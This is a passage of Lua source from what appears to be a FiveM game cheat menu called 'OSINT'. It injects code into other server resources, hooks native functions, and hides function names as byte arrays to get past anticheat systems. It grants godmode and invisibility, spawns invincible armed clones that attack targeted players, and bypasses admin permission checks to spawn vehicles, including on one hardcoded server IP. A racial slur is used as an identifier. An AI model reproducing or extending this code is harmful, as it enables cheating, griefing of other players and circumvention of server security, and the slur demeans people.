        return originalFn(ped, toggle, unk)
    end)
    
    if not _G.osintInvisibility then
        _G.osintInvisibility = {
            enabled = false,
            wasVisible = true,
        }
    end
    if not _G.osintInvisibility.enabled then
        _G.osintInvisibility.enabled = true
        local ped = PlayerPedId()
        _G.osintInvisibility.wasVisible = IsEntityVisible(ped)
        SetEntityVisible(ped, false, false)
        CreateThread(function()
            while _G.osintInvisibility and _G.osintInvisibility.enabled do
                local currentPed = PlayerPedId()
                if currentPed and DoesEntityExist(currentPed) then
                    SetEntityVisible(currentPed, false, false)
                end
                Wait(500)
            end
        end)
    end
end

function OSINT:DisableInvisibility()
    if _G.osintInvisibility and _G.osintInvisibility.enabled then
        _G.osintInvisibility.enabled = false
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            SetEntityVisible(ped, _G.osintInvisibility.wasVisible, false)
        end
    end
end

function OSINT:HandleAttackClonePlayer(playerIds)
    if not playerIds or #playerIds == 0 then return end
    
    local playerIdsStr = table.concat(playerIds, ",")
    MachoHookNative(0x240A18690AE96513, function(modelHash)
        return true, modelHash
    end)
    
    MachoHookNative(0xD49F9B0955C367DE, function(model, x, y, z, heading, isNetwork, thisScriptCheck)
        return true, model, x, y, z, heading, isNetwork, thisScriptCheck
    end)
    
    MachoInjectResourceRaw("monitor", string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
    ]], playerIdsStr))
end


function OSINT:HandleGodmodeToggle(enabled)
    local waveShieldStarted = GetResourceState("WaveShield") == "started"
    local targetResource = GetResourceState("monitor") == "started" and "monitor" or (waveShieldStarted and "WaveShield" or "any")

    if waveShieldStarted then
        if enabled then
            OSINT:Notify("success", "OSINT", "Godmode Enabled (WaveShield)", 3000)
            Injection(targetResource, [[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = true

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]])
        else
            OSINT:Notify("error", "OSINT", "Godmode Disabled (WaveShield)", 3000)
            Injection(targetResource, [[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = false

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]])
        end
        return
    end

    -- Non-WaveShield branch
    if enabled then
        OSINT:Notify("success", "OSINT", "Godmode Enabled", 3000)
        MachoInjectResource2(3, "any", [[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                if _G.osintGodmode and _G.osintGodmode.enabled then
                    return originalFn(player, true)
                end
                return originalFn(player, toggle)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            pcall(function() SetPlayerInvincible(PlayerId(), true) end)
        ]])
    else
        OSINT:Notify("error", "OSINT", "Godmode Disabled", 3000)
        MachoInjectResource2(3, "any", [[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                return originalFn(player, false)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                return false
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                return false
            end)

            for name, original in pairs(_G.osintGodmode.originals or {}) do
                if original and type(original) == "function" then
                    _G[name] = original
                end
            end
            _G.osintGodmode.originals = {}

            pcall(function() SetPlayerInvincible(PlayerId(), false) end)
        ]])
    end
end



function OSINT:SpawnSelectedVehicle(model, teleportInto, deletePrevious)
    if not model or model == "" then return end

    local ped = PlayerPedId()
    local currentVeh = GetVehiclePedIsIn(ped, false)
    local serverEndpoint = GetCurrentServerEndpoint()

    -- capture original coords/heading once so injected code can use literal numbers (avoid nil ogCoords inside injection)
    local ogCoords = GetEntityCoords(ped)
    local ogHeading = GetEntityHeading(ped)

    if GetResourceState("solos-rentals") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 1)", 3000)
        print("Creating Vehicle via Fallback #1")
        Injection("solos-rentals", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


            hNative("RequestModel", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("HasModelLoaded", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                return originalFn(model, x, y, z, heading, networked, p6)
            end)

            local model = "%s"
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            config.locations["customnigga"] = {
                vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
            }

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

            Citizen.CreateThread(function()
                Citizen.Wait(300) -- give spawn a short moment
                if %s then
                    -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                    local coords = config.locations["customnigga"].vehiclespawncoords
                    local x,y,z = coords.x, coords.y, coords.z
                    local hash = GetHashKey(model)
                    local vehicle = nil
                    -- try to find a nearby vehicle with that model hash
                    for ent in EnumerateVehicles() do
                        if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                            vehicle = ent
                            break
                        end
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                else
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            end)
        ]], model, tostring(deletePrevious), tostring(teleportInto), ogCoords.x, ogCoords.y, ogCoords.z, ogHeading))
    elseif GetResourceState("amigo") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 2)", 3000)
        print("Creating Vehicle via Fallback #2")
        Injection("adminMenu", string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local model = "%s"

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif targetResource then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 3)", 3000)
        print("Creating Vehicle via Fallback #3")
        Injection(targetResource, string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                Citizen.Wait(200)
                if %s then
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end
            end)
        ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif GetResourceState("qb-core") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 4)", 3000)
        print("Creating Vehicle via Fallback #4")
        Injection("qb-core", [[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "]] .. model .. [["

            if ]] .. tostring(deletePrevious) .. [[ then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            QBCore.Functions.SpawnVehicle(model, function(veh)
                Citizen.Wait(200)
                if ]] .. tostring(teleportInto) .. [[ then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                    end
                else
                    SetEntityCoords(PlayerPedId(), ]] .. ogCoords.x .. [[, ]] .. ogCoords.y .. [[, ]] .. ogCoords.z .. [[, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), ]] .. ogHeading .. [[)
                end
            end, GetEntityCoords(PlayerPedId()), true, true)
        ]])
    elseif serverEndpoint:match("([^:]+)") == "185.244.106.12" and GetResourceState("drc_gardener") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 5)", 3000)
        print("Creating Vehicle via Fallback #5")
        Injection("drc_gardener", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            local ogCoords = GetEntityCoords(PlayerPedId())
            local ogHeading = GetEntityHeading(PlayerPedId())

            SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

            if not %s then
                SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ogHeading)
            end
        ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif GetResourceState("lunar_bridge") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 6)", 3000)
        print("Creating Vehicle via Fallback #6")
        Injection("lunar_bridge", string.format([[
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.spawnVehicle(model, offset, heading, function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]], model, tostring(deletePrevious), tostring(teleportInto)))
    elseif GetResourceState("lation_laundering") == "started" then
        self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 7)", 3000)
        print("Creating Vehicle via Fallback #7")
        Injection("lation_laundering", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local function spawnVehicle()
                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                DoScreenFadeOut(800)
                while not IsScreenFadedOut() do
                    Citizen.Wait(100)
                end
                local vehicle = SpawnVehicle(model, position)
                if not vehicle or not DoesEntityExist(vehicle) then
                    ShowNotification("~r~Error: Failed to spawn vehicle.")
                    DoScreenFadeIn(800)
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
                SetModelAsNoLongerNeeded(GetHashKey(model))
                DoScreenFadeIn(800)
                ShowNotification("~g~Vehicle spawned successfully!")
            end

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            spawnVehicle()
        ]], model, tostring(teleportInto), tostring(deletePrevious)))
    else
        local fallback = enviGetStartedFallbackResource()
        if fallback then
            self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 8)", 3000)
            print("Creating Vehicle via Fallback #8")
            Injection(fallback, string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                Framework.SpawnVehicle(function(vehicle)
                    if not vehicle or not DoesEntityExist(vehicle) then
                        return
                    end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end, model, offset, false)
            ]], model, tostring(deletePrevious), tostring(teleportInto)))
elseif GetResourceState("monitor") == "started" or GetResourceState("ox_lib") == "started" then
    self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 9)", 3000)

    if not model or model == "" then return end

    local function b(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return "{" .. table.concat(t, ",") .. "}"
    end

    local modelLit = b(model)
    local deletePrev = tostring(deletePrevious)
    local warpIn = tostring(teleportInto)

    local payload = string.format([[
        local h = function(n, f)
            local o = _G[n]
            if o and type(o) == "function" then
                _G[n] = function(...) return f(o, ...) end
            end
        end
        local d = function(t)
            local s = ""
            for i = 1, #t do s = s .. string.char(t[i]) end
            return s
        end
        local g = function(e) return _G[d(e)] end
        local w = function(ms) Citizen.Wait(ms) end

        h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
        h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
        h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

        local function f()
            local p = g({80,108,97,121,101,114,80,101,100,73,100})()
            local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
            local mn = d(%s)
            local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

            g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

            if %s then
                local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                    g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                end
            end

            local z = c.z + 1.0
            local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

            if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                w(100)
            end
        end

        local co = coroutine.create(f)
        while coroutine.status(co) ~= "dead" do
            local ok = coroutine.resume(co)
            if not ok then break end
            w(0)
        end
    ]], modelLit, deletePrev, warpIn)

    local ok, err = pcall(MachoInjectResourceRaw, "monitor", payload)
    if not ok then
    end
    return
end

        if GetResourceState("lb-phone") == "started" then
            self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 10)", 3000)
            print("Creating Vehicle via Fallback #10")
            local success, err = pcall(function()
                Injection("lb-phone", ([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                    if not %s then
                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                        SetEntityHeading(PlayerPedId(), %f)
                    end
                ]]):format(tostring(deletePrevious), model, tostring(teleportInto), ogCoords.x, ogCoords.y, ogCoords.z, ogHeading))
            end)
            if not success then
            end
        elseif GetResourceState("qb-core") == "started" then
            self:Notify("info", "Vehicle Spawn", "Spawned Vehicle (Fallback 11)", 3000)
            print("Creating Vehicle via Fallback #11")
            Injection("lb-phone", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
                local success, err = pcall(function()
                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                    if not vehicle or not DoesEntityExist(vehicle) then return end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end)
            ]], tostring(deletePrevious), GetHashKey(model), tostring(teleportInto)))
        else
            return
        end
    end
end

local function IsOnlyReaperV4Active()
